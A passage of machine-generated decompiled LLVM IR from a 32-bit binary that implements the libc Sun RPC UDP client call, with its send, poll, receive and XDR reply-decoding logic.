  %v1_10022868 = inttoptr i32 %v3_1002285c to i32*
  %v2_10022868 = load i32, i32* %v1_10022868, align 4
  %v1_1002286c = add i32 %v2_10022868, 1
  store i32 %v1_1002286c, i32* %r9.global-to-local, align 4
  store i32 %v1_1002286c, i32* %v1_10022868, align 4
  %v0_10022874 = load i32, i32* @r26, align 4
  %v1_10022874 = add i32 %v0_10022874, 4
  %v2_10022874 = inttoptr i32 %v1_10022874 to i32*
  %v3_10022874 = load i32, i32* %v2_10022874, align 4
  store i32 %v3_10022874, i32* %r9.global-to-local, align 4
  %v1_10022878 = add i32 %v3_10022874, 4
  %v2_10022878 = inttoptr i32 %v1_10022878 to i32*
  %v3_10022878 = load i32, i32* %v2_10022878, align 4
  store i32 %v3_10022878, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10022878)
  %v0_10022884 = load i32, i32* %r3.global-to-local, align 4
  %v3_10022884 = icmp eq i32 %v0_10022884, 0
  br i1 %v3_10022884, label %dec_label_pc_100228c8, label %dec_label_pc_1002288c

dec_label_pc_1002288c:                            ; preds = %dec_label_pc_1002283c
  %v0_1002288c = load i32, i32* %r23.global-to-local, align 4
  %v1_1002288c = inttoptr i32 %v0_1002288c to i32*
  %v2_1002288c = load i32, i32* %v1_1002288c, align 4
  store i32 %v2_1002288c, i32* %r3.global-to-local, align 4
  %v1_10022894 = add i32 %v2_1002288c, 32
  %v2_10022894 = inttoptr i32 %v1_10022894 to i32*
  %v3_10022894 = load i32, i32* %v2_10022894, align 4
  store i32 %v3_10022894, i32* %r9.global-to-local, align 4
  %v1_10022898 = add i32 %v3_10022894, 4
  %v2_10022898 = inttoptr i32 %v1_10022898 to i32*
  %v3_10022898 = load i32, i32* %v2_10022898, align 4
  store i32 %v3_10022898, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10022898)
  %v0_100228a4 = load i32, i32* %r3.global-to-local, align 4
  %v3_100228a4 = icmp eq i32 %v0_100228a4, 0
  br i1 %v3_100228a4, label %dec_label_pc_100228c8, label %dec_label_pc_100228ac

dec_label_pc_100228ac:                            ; preds = %dec_label_pc_1002288c
  %v0_100228ac = load i32, i32* @r26, align 4
  store i32 %v0_100228ac, i32* %r3.global-to-local, align 4
  %v0_100228b4 = load i32, i32* %r20.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_100228b4)
  %v0_100228c0 = load i32, i32* %r3.global-to-local, align 4
  %v3_100228c0 = icmp eq i32 %v0_100228c0, 0
  br i1 %v3_100228c0, label %dec_label_pc_100228c8, label %dec_label_pc_100228d4

dec_label_pc_100228c8:                            ; preds = %dec_label_pc_100228ac, %dec_label_pc_1002288c, %dec_label_pc_1002283c
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10022a78

dec_label_pc_100228d4:                            ; preds = %dec_label_pc_100228ac
  %v0_100228d4 = load i32, i32* @r26, align 4
  %v1_100228d4 = add i32 %v0_100228d4, 4
  %v2_100228d4 = inttoptr i32 %v1_100228d4 to i32*
  %v3_100228d4 = load i32, i32* %v2_100228d4, align 4
  store i32 %v3_100228d4, i32* %r9.global-to-local, align 4
  store i32 %v0_100228d4, i32* %r3.global-to-local, align 4
  %v1_100228dc = add i32 %v3_100228d4, 16
  %v2_100228dc = inttoptr i32 %v1_100228dc to i32*
  %v3_100228dc = load i32, i32* %v2_100228dc, align 4
  store i32 %v3_100228dc, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_100228dc)
  %v0_100228e8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_100228e8, i32* %r19.global-to-local, align 4
  %v0_100228ec.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100228ec

dec_label_pc_100228ec:                            ; preds = %dec_label_pc_10022a68, %dec_label_pc_10022a5c, %dec_label_pc_100228d4
  %v0_100228fc = phi i32 [ %v0_10022a14, %dec_label_pc_10022a68 ], [ %v0_10022a14, %dec_label_pc_10022a5c ], [ %v0_100228ec.pre, %dec_label_pc_100228d4 ]
  %v1_100228ec = inttoptr i32 %v0_100228fc to i32*
  %v2_100228ec = load i32, i32* %v1_100228ec, align 4
  store i32 %v2_100228ec, i32* %r3.global-to-local, align 4
  %v0_100228f0 = load i32, i32* %r19.global-to-local, align 4
  %v1_100228f4 = add i32 %v0_100228fc, 88
  %v2_100228f4 = inttoptr i32 %v1_100228f4 to i32*
  %v3_100228f4 = load i32, i32* %v2_100228f4, align 4
  %v1_100228fc = add i32 %v0_100228fc, 24
  %v2_100228fc = inttoptr i32 %v1_100228fc to i32*
  %v3_100228fc = load i32, i32* %v2_100228fc, align 4
  %v1_10022900 = add i32 %v0_100228fc, 8
  store i32 268577032, i32* @lr, align 4
  %v6_10022904 = call i32 @__libc_sendto(i32 %v2_100228ec, i32 %v3_100228f4, i32 %v0_100228f0, i32 0, i32 %v1_10022900, i32 %v3_100228fc)
  store i32 %v6_10022904, i32* %r3.global-to-local, align 4
  %v1_10022908 = load i32, i32* %r19.global-to-local, align 4
  %v4_10022908 = icmp eq i32 %v6_10022904, %v1_10022908
  br i1 %v4_10022908, label %dec_label_pc_10022910, label %dec_label_pc_100227ec

dec_label_pc_10022910:                            ; preds = %dec_label_pc_100228ec
  %v0_10022910 = load i32, i32* %r21.global-to-local, align 4
  %v3_10022910 = icmp eq i32 %v0_10022910, 0
  br i1 %v3_10022910, label %dec_label_pc_10022918, label %dec_label_pc_10022920

dec_label_pc_10022918:                            ; preds = %dec_label_pc_10022910
  %v0_10022918 = load i32, i32* %r22.global-to-local, align 4
  %v3_10022918 = icmp eq i32 %v0_10022918, 0
  br i1 %v3_10022918, label %dec_label_pc_10022a70, label %dec_label_pc_10022920

dec_label_pc_10022920:                            ; preds = %dec_label_pc_10022910, %dec_label_pc_10022918, %dec_label_pc_10022830
  store i32 ptrtoint (i32* @global_var_1004eed8.1298 to i32), i32* %r9.global-to-local, align 4
  %v0_10022944 = load i32, i32* @r30, align 4
  %v1_10022944 = inttoptr i32 %v0_10022944 to i32*
  %v2_10022944 = load i32, i32* %v1_10022944, align 4
  store i32 %v2_10022944, i32* %r9.global-to-local, align 4
  store i32 %v2_10022944, i32* %stack_var_-9060, align 4
  br label %dec_label_pc_10022950

dec_label_pc_10022950:                            ; preds = %dec_label_pc_10022a80, %dec_label_pc_10022c34, %dec_label_pc_10022c24, %dec_label_pc_10022c1c, %dec_label_pc_10022920
  store i32 %v2_10022950, i32* %r3.global-to-local, align 4
  %v0_10022958 = load i32, i32* %r16.global-to-local, align 4
  store i32 268577120, i32* @lr, align 4
  %v3_1002295c = call i32 @__libc_poll(i32 %v2_10022950, i32 1, i32 %v0_10022958)
  store i32 %v3_1002295c, i32* %r3.global-to-local, align 4
  %v3_10022960 = icmp eq i32 %v3_1002295c, -1
  br i1 %v3_10022960, label %dec_label_pc_10022a80, label %dec_label_pc_10022968

dec_label_pc_10022968:                            ; preds = %dec_label_pc_10022950
  %v3_10022968 = icmp eq i32 %v3_1002295c, 0
  br i1 %v3_10022968, label %dec_label_pc_10022970, label %dec_label_pc_10022a90

dec_label_pc_10022970:                            ; preds = %dec_label_pc_10022968
  %v0_10022970 = load i32, i32* @r30, align 4
  %v1_10022970 = inttoptr i32 %v0_10022970 to i32*
  %v2_10022970 = load i32, i32* %v1_10022970, align 4
  store i32 %v2_10022970, i32* %r25.global-to-local, align 4
  store i32 8800, i32* %stack_var_-9044, align 4
  store i32 35090, i32* @r4, align 4
  store i32 %v2_10022970, i32* @r3, align 4
  store i32 %v2_1002298c, i32* @r5, align 4
  store i32 268577180, i32* @lr, align 4
  %v0_10022998 = call i32 @ioctl()
  store i32 %v0_10022998, i32* %r3.global-to-local, align 4
  %v3_1002299c = icmp eq i32 %v0_10022998, 0
  br i1 %v3_1002299c, label %dec_label_pc_100229a4, label %dec_label_pc_10022a08

dec_label_pc_100229a4:                            ; preds = %dec_label_pc_10022970
  %v3_100229a4 = load i32, i32* %stack_var_-9044, align 4
  store i32 %v2_10022ab0, i32* @r29, align 4
  %v1_100229ac = udiv i32 %v3_100229a4, 32
  %tmp83 = icmp ugt i32 %v3_100229a4, 31
  store i32 35091, i32* @r4, align 4
  %v0_100229fc79 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_100229fc79, i32* @r3, align 4
  %v1_10022a0080 = add nsw i32 %v1_100229ac, -1
  store i32 %v1_10022a0080, i32* @r28, align 4
  br i1 %tmp83, label %dec_label_pc_100229b4, label %dec_label_pc_10022a08

dec_label_pc_100229b4:                            ; preds = %dec_label_pc_100229a4, %dec_label_pc_100229e8
  store i32 %v2_100229f4, i32* @r5, align 4
  store i32 268577224, i32* @lr, align 4
  %v0_100229c4 = call i32 @ioctl()
  store i32 %v0_100229c4, i32* %r3.global-to-local, align 4
  %v1_100229c8 = icmp slt i32 %v0_100229c4, 0
  br i1 %v1_100229c8, label %dec_label_pc_10022a08, label %dec_label_pc_100229d0

dec_label_pc_100229d0:                            ; preds = %dec_label_pc_100229b4
  store i32 %v1_100229d4, i32* %r9.global-to-local, align 4
  %v0_100229e8.pre = load i32, i32* @r29, align 4
  br i1 %v3_100229d4, label %dec_label_pc_100229e8, label %dec_label_pc_100229dc

dec_label_pc_100229dc:                            ; preds = %dec_label_pc_100229d0
  %v1_100229dc = add i32 %v0_100229e8.pre, 16
  %v2_100229dc = inttoptr i32 %v1_100229dc to i16*
  %v3_100229dc = load i16, i16* %v2_100229dc, align 2
  %v3_100229e0 = icmp eq i16 %v3_100229dc, 2
  br i1 %v3_100229e0, label %dec_label_pc_10022a14, label %dec_label_pc_100229e8

dec_label_pc_100229e8:                            ; preds = %dec_label_pc_100229d0, %dec_label_pc_100229dc
  %v1_100229e8 = add i32 %v0_100229e8.pre, 32
  store i32 %v1_100229e8, i32* @r29, align 4
  %v0_100229ec.pre = load i32, i32* @r28, align 4
  %v2_100229ec = icmp sgt i32 %v0_100229ec.pre, 0
  store i32 35091, i32* @r4, align 4
  %v0_100229fc = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_100229fc, i32* @r3, align 4
  %v1_10022a00 = add i32 %v0_100229ec.pre, -1
  store i32 %v1_10022a00, i32* @r28, align 4
  br i1 %v2_100229ec, label %dec_label_pc_100229b4, label %dec_label_pc_10022a08

dec_label_pc_10022a08:                            ; preds = %dec_label_pc_10022970, %dec_label_pc_100229a4, %dec_label_pc_100229e8, %dec_label_pc_100229b4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10022a78

dec_label_pc_10022a14:                            ; preds = %dec_label_pc_100229dc
  %v0_10022a14 = load i32, i32* @r30, align 4
  %v1_10022a14 = add i32 %v0_10022a14, 32
  %v2_10022a14 = inttoptr i32 %v1_10022a14 to i32*
  %v3_10022a14 = load i32, i32* %v2_10022a14, align 4
  store i32 1000000, i32* %r9.global-to-local, align 4
  %v0_10022a20 = load i32, i32* %r24.global-to-local, align 4
  %v2_10022a20 = add i32 %v0_10022a20, %v3_10022a14
  store i32 %v2_10022a20, i32* %r24.global-to-local, align 4
  %v1_10022a24 = add i32 %v0_10022a14, 28
  %v2_10022a24 = inttoptr i32 %v1_10022a24 to i32*
  %v3_10022a24 = load i32, i32* %v2_10022a24, align 4
  %v2_10022a28 = udiv i32 %v2_10022a20, 1000000
  %v0_10022a30 = load i32, i32* %r18.global-to-local, align 4
  %v2_10022a30 = add i32 %v0_10022a30, %v3_10022a24
  store i32 %v2_10022a30, i32* %r18.global-to-local, align 4
  %v1_10022a34 = add nuw nsw i32 %v2_10022a28, 1
  store i32 %v1_10022a34, i32* %r9.global-to-local, align 4
  %tmp65 = icmp sgt i32 %v2_10022a20, -1
  br i1 %tmp65, label %dec_label_pc_10022a54.preheader, label %dec_label_pc_10022a54.preheader.thread

dec_label_pc_10022a54.preheader.thread:           ; preds = %dec_label_pc_10022a14
  %v1_10022a541230 = add i32 %v2_10022a20, -983040
  store i32 %v1_10022a541230, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10022a5c

dec_label_pc_10022a54.preheader:                  ; preds = %dec_label_pc_10022a14
  %v1_10022a5412 = add i32 %v2_10022a20, -983040
  store i32 %v1_10022a5412, i32* %r9.global-to-local, align 4
  %tmp66 = icmp ult i32 %v2_10022a20, 1000000
  br i1 %tmp66, label %dec_label_pc_10022a5c, label %dec_label_pc_10022a4c.lr.ph

dec_label_pc_10022a4c.lr.ph:                      ; preds = %dec_label_pc_10022a54.preheader
  %tmp67 = mul i32 %v2_10022a28, 1000000
  %tmp68 = add i32 %v2_10022a30, %v2_10022a28
  %tmp71 = sub i32 %v1_10022a5412, %tmp67
  %v1_10022a50 = sub i32 %v2_10022a20, %tmp67
  store i32 %tmp68, i32* %r18.global-to-local, align 4
  store i32 %tmp71, i32* %r9.global-to-local, align 4
  store i32 %v1_10022a50, i32* %r24.global-to-local, align 4
  br label %dec_label_pc_10022a5c

dec_label_pc_10022a5c:                            ; preds = %dec_label_pc_10022a54.preheader.thread, %dec_label_pc_10022a4c.lr.ph, %dec_label_pc_10022a54.preheader
  %v0_10022a68 = phi i32 [ %v1_10022a50, %dec_label_pc_10022a4c.lr.ph ], [ %v2_10022a20, %dec_label_pc_10022a54.preheader ], [ %v2_10022a20, %dec_label_pc_10022a54.preheader.thread ]
  %v0_10022a5c.lcssa = phi i32 [ %tmp68, %dec_label_pc_10022a4c.lr.ph ], [ %v2_10022a30, %dec_label_pc_10022a54.preheader ], [ %v2_10022a30, %dec_label_pc_10022a54.preheader.thread ]
  %v1_10022a5c = load i32, i32* %r21.global-to-local, align 4
  %v2_10022a5c = icmp slt i32 %v0_10022a5c.lcssa, %v1_10022a5c
  br i1 %v2_10022a5c, label %dec_label_pc_100228ec, label %dec_label_pc_10022a64

dec_label_pc_10022a64:                            ; preds = %dec_label_pc_10022a5c
  %v4_10022a5c = icmp eq i32 %v0_10022a5c.lcssa, %v1_10022a5c
  br i1 %v4_10022a5c, label %dec_label_pc_10022a68, label %dec_label_pc_10022a70

dec_label_pc_10022a68:                            ; preds = %dec_label_pc_10022a64
  %v1_10022a68 = load i32, i32* %r22.global-to-local, align 4
  %v2_10022a68 = icmp slt i32 %v0_10022a68, %v1_10022a68
  br i1 %v2_10022a68, label %dec_label_pc_100228ec, label %dec_label_pc_10022a70

dec_label_pc_10022a70:                            ; preds = %dec_label_pc_10022a64, %dec_label_pc_10022a68, %dec_label_pc_10022918
  store i32 5, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10022a78

dec_label_pc_10022a78:                            ; preds = %dec_label_pc_10022a08, %dec_label_pc_100228c8, %dec_label_pc_10022a70
  %v0_10022a78 = phi i32 [ 4, %dec_label_pc_10022a08 ], [ 1, %dec_label_pc_100228c8 ], [ 5, %dec_label_pc_10022a70 ]
  %v1_10022a78 = load i32, i32* @r30, align 4
  %v2_10022a78 = add i32 %v1_10022a78, 44
  %v3_10022a78 = inttoptr i32 %v2_10022a78 to i32*
  store i32 %v0_10022a78, i32* %v3_10022a78, align 4
  br label %dec_label_pc_10022d20

dec_label_pc_10022a80:                            ; preds = %dec_label_pc_10022950
  %v0_10022a80 = call i32 @__errno_location()
  store i32 %v0_10022a80, i32* %r3.global-to-local, align 4
  %v1_10022a84 = inttoptr i32 %v0_10022a80 to i32*
  %v2_10022a84 = load i32, i32* %v1_10022a84, align 4
  store i32 %v2_10022a84, i32* %r9.global-to-local, align 4
  %v3_10022a88 = icmp eq i32 %v2_10022a84, 4
  br i1 %v3_10022a88, label %dec_label_pc_10022950, label %dec_label_pc_10022804

dec_label_pc_10022a90:                            ; preds = %dec_label_pc_10022968
  store i32 %v1_10022a94, i32* %r9.global-to-local, align 4
  br i1 %v3_10022a94, label %dec_label_pc_10022bd0, label %dec_label_pc_10022a9c

dec_label_pc_10022a9c:                            ; preds = %dec_label_pc_10022a90
  %v0_10022a9c = load i32, i32* %r19.global-to-local, align 4
  %v1_10022a9c = add i32 %v0_10022a9c, 286
  %v2_10022aa0 = load i32, i32* %stack_var_-9072, align 4
  store i32 %v2_10022aa0, i32* %r9.global-to-local, align 4
  %v1_10022aa4 = call i32 @__asm_rlwinm(i32 %v1_10022a9c, i32 0, i32 0, i32 27)
  %v0_10022ab4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10022ab4 = load i32, i32* @r1, align 4
  %v3_10022ab4 = sub i32 %v1_10022ab4, %v1_10022aa4
  %v4_10022ab4 = inttoptr i32 %v3_10022ab4 to i32*
  store i32 %v0_10022ab4, i32* %v4_10022ab4, align 4
  store i32 %v2_10022ab8, i32* %stack_var_-8900, align 4
  %v1_10022ad0 = add i32 %v3_10022ab4, 23
  store i32 %v1_10022ad0, i32* %r9.global-to-local, align 4
  %v1_10022ad8 = call i32 @__asm_rlwinm(i32 %v1_10022ad0, i32 0, i32 0, i32 27)
  store i32 %v1_10022ad8, i32* %r9.global-to-local, align 4
  %v1_10022ae8 = add i32 %v1_10022ad8, 256
  store i32 %v1_10022ae8, i32* %r28.global-to-local, align 4
  %v0_10022b00 = load i32, i32* @r30, align 4
  %v1_10022b00 = inttoptr i32 %v0_10022b00 to i32*
  %v2_10022b00 = load i32, i32* %v1_10022b00, align 4
  store i32 %v2_10022b00, i32* %r3.global-to-local, align 4
  store i32 268577544, i32* @lr, align 4
  %v3_10022b04 = call i32 @__libc_recvmsg(i32 %v2_10022b00, i32 8192, i32 8192)
  store i32 %v3_10022b04, i32* %r3.global-to-local, align 4
  %v1_10022b08 = icmp slt i32 %v3_10022b04, 0
  br i1 %v1_10022b08, label %dec_label_pc_10022bd0, label %dec_label_pc_10022b10

dec_label_pc_10022b10:                            ; preds = %dec_label_pc_10022a9c
  %v0_10022b10 = load i32, i32* @r30, align 4
  %v1_10022b10 = add i32 %v0_10022b10, 88
  %v2_10022b10 = inttoptr i32 %v1_10022b10 to i32*
  %v3_10022b10 = load i32, i32* %v2_10022b10, align 4
  store i32 %v3_10022b10, i32* @r4, align 4
  %v0_10022b14 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10022b14, i32* @r3, align 4
  %v3_10022b1c = call i32 @bcmp(i32 %v0_10022b14, i32 %v3_10022b10, i32 %v3_10022b04)
  store i32 %v3_10022b1c, i32* %r3.global-to-local, align 4
  %v3_10022b20 = icmp eq i32 %v3_10022b1c, 0
  br i1 %v3_10022b20, label %dec_label_pc_10022b28, label %dec_label_pc_10022bd0

dec_label_pc_10022b28:                            ; preds = %dec_label_pc_10022b10
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10022bd0

dec_label_pc_10022bd0:                            ; preds = %dec_label_pc_10022b28, %dec_label_pc_10022b10, %dec_label_pc_10022a9c, %dec_label_pc_10022a90, %dec_label_pc_10022c00
  %v0_10022bd4 = load i32, i32* @r30, align 4
  %v1_10022bd4 = add i32 %v0_10022bd4, 96
  store i32 %v1_10022bd4, i32* %r28.global-to-local, align 4
  store i32 16, i32* %stack_var_-9064, align 4
  %v1_10022be8 = add i32 %v0_10022bd4, 92
  %v2_10022be8 = inttoptr i32 %v1_10022be8 to i32*
  %v3_10022be8 = load i32, i32* %v2_10022be8, align 4
  %v1_10022bf0 = inttoptr i32 %v0_10022bd4 to i32*
  %v2_10022bf0 = load i32, i32* %v1_10022bf0, align 4
  store i32 %v2_10022bf0, i32* %r3.global-to-local, align 4
  store i32 268577784, i32* @lr, align 4
  %v6_10022bf4 = call i32 @__libc_recvfrom(i32 %v2_10022bf0, i32 %v1_10022bd4, i32 %v3_10022be8, i32 0, i32 %v2_10022be4, i32 %v2_10022bec)
  store i32 %v6_10022bf4, i32* %r3.global-to-local, align 4
  %tmp72 = icmp sgt i32 %v6_10022bf4, -1
  br i1 %tmp72, label %dec_label_pc_10022c24, label %dec_label_pc_10022c00

dec_label_pc_10022c00:                            ; preds = %dec_label_pc_10022bd0
  %v0_10022c00 = call i32 @__errno_location()
  store i32 %v0_10022c00, i32* %r3.global-to-local, align 4
  %v1_10022c04 = inttoptr i32 %v0_10022c00 to i32*
  %v2_10022c04 = load i32, i32* %v1_10022c04, align 4
  %v3_10022c08 = icmp eq i32 %v2_10022c04, 4
  br i1 %v3_10022c08, label %dec_label_pc_10022bd0, label %dec_label_pc_10022c1c

dec_label_pc_10022c1c:                            ; preds = %dec_label_pc_10022c00
  %v0_10022c10 = call i32 @__errno_location()
  store i32 %v0_10022c10, i32* %r3.global-to-local, align 4
  %v1_10022c14 = inttoptr i32 %v0_10022c10 to i32*
  %v2_10022c14 = load i32, i32* %v1_10022c14, align 4
  store i32 %v2_10022c14, i32* %r9.global-to-local, align 4
  %v3_10022c18 = icmp eq i32 %v2_10022c14, 11
  br i1 %v3_10022c18, label %dec_label_pc_10022950, label %dec_label_pc_10022804

dec_label_pc_10022c24:                            ; preds = %dec_label_pc_10022bd0
  %tmp73 = icmp slt i32 %v6_10022bf4, 4
  br i1 %tmp73, label %dec_label_pc_10022950, label %dec_label_pc_10022c2c

dec_label_pc_10022c2c:                            ; preds = %dec_label_pc_10022c24
  %v0_10022c2c = load i32, i32* %r20.global-to-local, align 4
  %v3_10022c2c = icmp eq i32 %v0_10022c2c, 0
  br i1 %v3_10022c2c, label %dec_label_pc_10022c48, label %dec_label_pc_10022c34

dec_label_pc_10022c34:                            ; preds = %dec_label_pc_10022c2c
  %v0_10022c34 = load i32, i32* @r30, align 4
  %v1_10022c34 = add i32 %v0_10022c34, 88
  %v2_10022c34 = inttoptr i32 %v1_10022c34 to i32*
  %v3_10022c34 = load i32, i32* %v2_10022c34, align 4
  store i32 %v3_10022c34, i32* %r9.global-to-local, align 4
  %v1_10022c38 = add i32 %v0_10022c34, 96
  %v2_10022c38 = inttoptr i32 %v1_10022c38 to i32*
  %v3_10022c38 = load i32, i32* %v2_10022c38, align 4
  %v1_10022c3c = inttoptr i32 %v3_10022c34 to i32*
  %v2_10022c3c = load i32, i32* %v1_10022c3c, align 4
  %v4_10022c40 = icmp eq i32 %v3_10022c38, %v2_10022c3c
  br i1 %v4_10022c40, label %dec_label_pc_10022c48, label %dec_label_pc_10022950

dec_label_pc_10022c48:                            ; preds = %dec_label_pc_10022c34, %dec_label_pc_10022c2c
  %v0_10022c4c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v2_10022c48, i32* %r3.global-to-local, align 4
  store i32 %v2_10022c5c, i32* %r28.global-to-local, align 4
  %v5_10022c60 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-9004, i32 %v0_10022c4c, i32 %v6_10022bf4, i32 1)
  store i32 %v2_10022c48, i32* %r3.global-to-local, align 4
  store i32 268577904, i32* @lr, align 4
  %v2_10022c6c = call i32 @__GI_xdr_replymsg(i32 %v2_10022c48, i32 %v2_10022c5c)
  store i32 %v2_10022c6c, i32* %r3.global-to-local, align 4
  %v3_10022c70 = icmp eq i32 %v2_10022c6c, 0
  br i1 %v3_10022c70, label %dec_label_pc_10022d14, label %dec_label_pc_10022c78

dec_label_pc_10022c78:                            ; preds = %dec_label_pc_10022c48
  store i32 %v2_10022c5c, i32* %r3.global-to-local, align 4
  %v0_10022c7c = load i32, i32* @r30, align 4
  %v1_10022c7c = add i32 %v0_10022c7c, 44
  store i32 268577924, i32* @lr, align 4
  %v2_10022c80 = inttoptr i32 %v1_10022c7c to i32*
  %v3_10022c80 = call i32 @__GI__seterr_reply(i32 %v2_10022c5c, i32* %v2_10022c80)
  store i32 %v3_10022c80, i32* %r3.global-to-local, align 4
  %v0_10022c84 = load i32, i32* @r30, align 4
  %v1_10022c84 = add i32 %v0_10022c84, 44
  %v2_10022c84 = inttoptr i32 %v1_10022c84 to i32*
  %v3_10022c84 = load i32, i32* %v2_10022c84, align 4
  %v3_10022c88 = icmp eq i32 %v3_10022c84, 0
  br i1 %v3_10022c88, label %dec_label_pc_10022c90, label %dec_label_pc_10022ce8

dec_label_pc_10022c90:                            ; preds = %dec_label_pc_10022c78
  %v0_10022c90 = load i32, i32* %r23.global-to-local, align 4
  %v1_10022c90 = inttoptr i32 %v0_10022c90 to i32*
  %v2_10022c90 = load i32, i32* %v1_10022c90, align 4
  store i32 %v2_10022c90, i32* %r3.global-to-local, align 4
  %v1_10022c9c = add i32 %v2_10022c90, 32
  %v2_10022c9c = inttoptr i32 %v1_10022c9c to i32*
  %v3_10022c9c = load i32, i32* %v2_10022c9c, align 4
  store i32 %v3_10022c9c, i32* %r9.global-to-local, align 4
  %v1_10022ca0 = add i32 %v3_10022c9c, 8
  %v2_10022ca0 = inttoptr i32 %v1_10022ca0 to i32*
  %v3_10022ca0 = load i32, i32* %v2_10022ca0, align 4
  store i32 %v3_10022ca0, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10022ca0)
  %v0_10022cac = load i32, i32* %r3.global-to-local, align 4
  %v3_10022cac = icmp eq i32 %v0_10022cac, 0
  br i1 %v3_10022cac, label %dec_label_pc_10022cb4, label %dec_label_pc_10022cc4

dec_label_pc_10022cb4:                            ; preds = %dec_label_pc_10022c90
  %v1_10022cb8 = load i32, i32* @r30, align 4
  %v2_10022cb8 = add i32 %v1_10022cb8, 44
  %v3_10022cb8 = inttoptr i32 %v2_10022cb8 to i32*
  store i32 7, i32* %v3_10022cb8, align 4
  %v1_10022cc0 = load i32, i32* @r30, align 4
  %v2_10022cc0 = add i32 %v1_10022cc0, 48
  %v3_10022cc0 = inttoptr i32 %v2_10022cc0 to i32*
  store i32 6, i32* %v3_10022cc0, align 4
  br label %dec_label_pc_10022cc4

dec_label_pc_10022cc4:                            ; preds = %dec_label_pc_10022c90, %dec_label_pc_10022cb4
  %v3_10022cc8 = icmp eq i32 %tmp33, 0
  br i1 %v3_10022cc8, label %dec_label_pc_10022d1c, label %dec_label_pc_10022cd0

dec_label_pc_10022cd0:                            ; preds = %dec_label_pc_10022cc4
  %v0_10022cd4 = load i32, i32* @r26, align 4
  store i32 %v0_10022cd4, i32* @r3, align 4
  %v2_10022cd8 = inttoptr i32 %v0_10022cd4 to i32*
  store i32 2, i32* %v2_10022cd8, align 4
  store i32 %v2_10022924, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10022ce4.1299 to i32), i32* @lr, align 4
  %v0_10022ce0 = call i32 @xdr_opaque_auth()
  store i32 %v0_10022ce0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10022d1c

dec_label_pc_10022ce8:                            ; preds = %dec_label_pc_10022c78
  %v0_10022ce8 = load i32, i32* %r17.global-to-local, align 4
  %tmp74 = icmp slt i32 %v0_10022ce8, 1
  br i1 %tmp74, label %dec_label_pc_10022d1c, label %dec_label_pc_10022cf0

dec_label_pc_10022cf0:                            ; preds = %dec_label_pc_10022ce8
  %v0_10022cf0 = load i32, i32* %r23.global-to-local, align 4
  %v1_10022cf0 = inttoptr i32 %v0_10022cf0 to i32*
  %v2_10022cf0 = load i32, i32* %v1_10022cf0, align 4
  store i32 %v2_10022cf0, i32* %r3.global-to-local, align 4
  %v1_10022cf4 = add i32 %v2_10022cf0, 32
  %v2_10022cf4 = inttoptr i32 %v1_10022cf4 to i32*
  %v3_10022cf4 = load i32, i32* %v2_10022cf4, align 4
  store i32 %v3_10022cf4, i32* %r9.global-to-local, align 4
  %v1_10022cf8 = add i32 %v3_10022cf4, 12
  %v2_10022cf8 = inttoptr i32 %v1_10022cf8 to i32*
  %v3_10022cf8 = load i32, i32* %v2_10022cf8, align 4
  store i32 %v3_10022cf8, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10022cf8)
  %v0_10022d04 = load i32, i32* %r3.global-to-local, align 4
  %v3_10022d04 = icmp eq i32 %v0_10022d04, 0
  br i1 %v3_10022d04, label %dec_label_pc_10022d1c, label %dec_label_pc_10022d0c

dec_label_pc_10022d0c:                            ; preds = %dec_label_pc_10022cf0
  %v0_10022d0c = load i32, i32* %r17.global-to-local, align 4
  %v1_10022d0c = add i32 %v0_10022d0c, -1
  store i32 %v1_10022d0c, i32* %r17.global-to-local, align 4
  %v0_10022830.pre = load i32, i32* %r20.global-to-local, align 4
  %v0_10022834.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10022830

dec_label_pc_10022d14:                            ; preds = %dec_label_pc_10022c48
  %v1_10022d18 = load i32, i32* @r30, align 4
  %v2_10022d18 = add i32 %v1_10022d18, 44
  %v3_10022d18 = inttoptr i32 %v2_10022d18 to i32*
  store i32 2, i32* %v3_10022d18, align 4
  br label %dec_label_pc_10022d1c

dec_label_pc_10022d1c:                            ; preds = %dec_label_pc_10022cf0, %dec_label_pc_10022ce8, %dec_label_pc_10022cc4, %dec_label_pc_10022cd0, %dec_label_pc_10022d14
  %v0_10022d1c = load i32, i32* @r30, align 4
  %v1_10022d1c = add i32 %v0_10022d1c, 44
  %v2_10022d1c = inttoptr i32 %v1_10022d1c to i32*
  %v3_10022d1c = load i32, i32* %v2_10022d1c, align 4
  store i32 %v3_10022d1c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10022d20

dec_label_pc_10022d20:                            ; preds = %dec_label_pc_10022a78, %dec_label_pc_1002280c, %dec_label_pc_10022d1c
  %v0_10022d34 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10022d34

; uselistorder directives
  uselistorder i32 %v0_10022bd4, { 1, 0, 2 }
  uselistorder i32 %v0_10022a5c.lcssa, { 1, 0 }
  uselistorder i32 %v1_10022a50, { 1, 0 }
  uselistorder i32 %v2_10022a30, { 1, 2, 0, 3 }
  uselistorder i32 %v2_10022a20, { 2, 3, 0, 1, 6, 4, 5, 7, 8 }
  uselistorder i32 %v0_10022a14, { 2, 3, 1, 0 }
  uselistorder i32 %v0_100229ec.pre, { 1, 0 }
  uselistorder i32 %v0_100228fc, { 1, 0, 3, 2 }
  uselistorder i32 %v2_10022c5c, { 1, 0, 2, 3 }
